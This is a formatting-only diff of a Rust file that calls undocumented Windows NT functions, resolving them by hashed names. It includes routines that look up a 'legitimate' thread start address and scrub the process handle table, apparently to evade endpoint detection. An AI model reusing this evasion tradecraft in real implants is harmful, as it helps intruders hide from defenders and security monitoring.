@@ -230,10 +230,10 @@ unsafe fn nt_query_information_thread(
     )?;
 
     let func: extern "system" fn(
-        usize,  // ThreadHandle
-        u32,    // ThreadInformationClass
-        *mut u8, // ThreadInformation
-        u32,    // ThreadInformationLength
+        usize,    // ThreadHandle
+        u32,      // ThreadInformationClass
+        *mut u8,  // ThreadInformation
+        u32,      // ThreadInformationLength
         *mut u32, // ReturnLength
     ) -> i32 = std::mem::transmute(func_addr);
 
@@ -254,10 +254,10 @@ unsafe fn nt_set_information_thread(
     )?;
 
     let func: extern "system" fn(
-        usize,      // ThreadHandle
-        u32,        // ThreadInformationClass
-        *const u8,  // ThreadInformation
-        u32,        // ThreadInformationLength
+        usize,     // ThreadHandle
+        u32,       // ThreadInformationClass
+        *const u8, // ThreadInformation
+        u32,       // ThreadInformationLength
     ) -> i32 = std::mem::transmute(func_addr);
 
     Some(func(thread_handle, info_class, info, info_len))
@@ -277,10 +277,10 @@ unsafe fn nt_query_system_information(
     )?;
 
     let func: extern "system" fn(
-        u32,       // SystemInformationClass
-        *mut u8,   // SystemInformation
-        u32,       // SystemInformationLength
-        *mut u32,  // ReturnLength
+        u32,      // SystemInformationClass
+        *mut u8,  // SystemInformation
+        u32,      // SystemInformationLength
+        *mut u32, // ReturnLength
     ) -> i32 = std::mem::transmute(func_addr);
 
     Some(func(info_class, info, info_len, ret_len))
@@ -303,19 +303,17 @@ unsafe fn nt_duplicate_object(
     options: u64,
 ) -> Option<i32> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
-    let func_addr = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtDuplicateObject\0"),
-    )?;
+    let func_addr =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtDuplicateObject\0"))?;
 
     let func: extern "system" fn(
-        usize,       // SourceProcessHandle
-        usize,       // SourceHandle
-        usize,       // TargetProcessHandle
-        *mut usize,  // TargetHandle
-        u64,         // DesiredAccess
-        u64,         // HandleAttributes
-        u64,         // Options
+        usize,      // SourceProcessHandle
+        usize,      // SourceHandle
+        usize,      // TargetProcessHandle
+        *mut usize, // TargetHandle
+        u64,        // DesiredAccess
+        u64,        // HandleAttributes
+        u64,        // Options
     ) -> i32 = std::mem::transmute(func_addr);
 
     Some(func(
@@ -756,21 +754,17 @@ unsafe fn resolve_legitimate_thread_start() -> usize {
         None => return 0,
     };
 
-    match pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"RtlUserThreadStart\0"),
-    ) {
+    match pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"RtlUserThreadStart\0"))
+    {
         Some(addr) => addr,
         None => {
             // Fallback: kernel32!BaseThreadInitThunk.
             match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
-                Some(k32) => {
-                    pe_resolve::get_proc_address_by_hash(
-                        k32,
-                        pe_resolve::hash_str(b"BaseThreadInitThunk\0"),
-                    )
-                    .unwrap_or(0)
-                }
+                Some(k32) => pe_resolve::get_proc_address_by_hash(
+                    k32,
+                    pe_resolve::hash_str(b"BaseThreadInitThunk\0"),
+                )
+                .unwrap_or(0),
                 None => 0,
             }
         }
@@ -831,12 +825,14 @@ pub unsafe fn scrub_handle_table() {
                 // STATUS_INFO_LENGTH_MISMATCH or resolution failed — grow buffer.
                 if buf_len > 0x1000000 {
                     // 16 MB safety limit.
-                    log::warn!(
-                        "[memory_hygiene] handle table buffer exceeded 16 MB, giving up"
-                    );
+                    log::warn!("[memory_hygiene] handle table buffer exceeded 16 MB, giving up");
                     break;
                 }
-                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
+                buf_len = if ret_len > buf_len {
+                    ret_len
+                } else {
+                    buf_len * 2
+                };
             }
             Some(s) => {
                 log::warn!(
@@ -1036,11 +1032,11 @@ unsafe fn is_section_handle_to_image(handle: usize, image_base: usize) -> bool {
     let mut sbi: [u64; 3] = [0; 3];
 
     let query_section: extern "system" fn(
-        usize,     // SectionHandle
-        u32,       // SectionInformationClass (0 = SectionBasicInformation)
-        *mut u8,   // SectionInformation
-        usize,     // SectionInformationLength
-        *mut u32,  // ReturnLength
+        usize,    // SectionHandle
+        u32,      // SectionInformationClass (0 = SectionBasicInformation)
+        *mut u8,  // SectionInformation
+        usize,    // SectionInformationLength
+        *mut u32, // ReturnLength
     ) -> i32 = std::mem::transmute(query_section_addr);
 
     let sec_status = query_section(
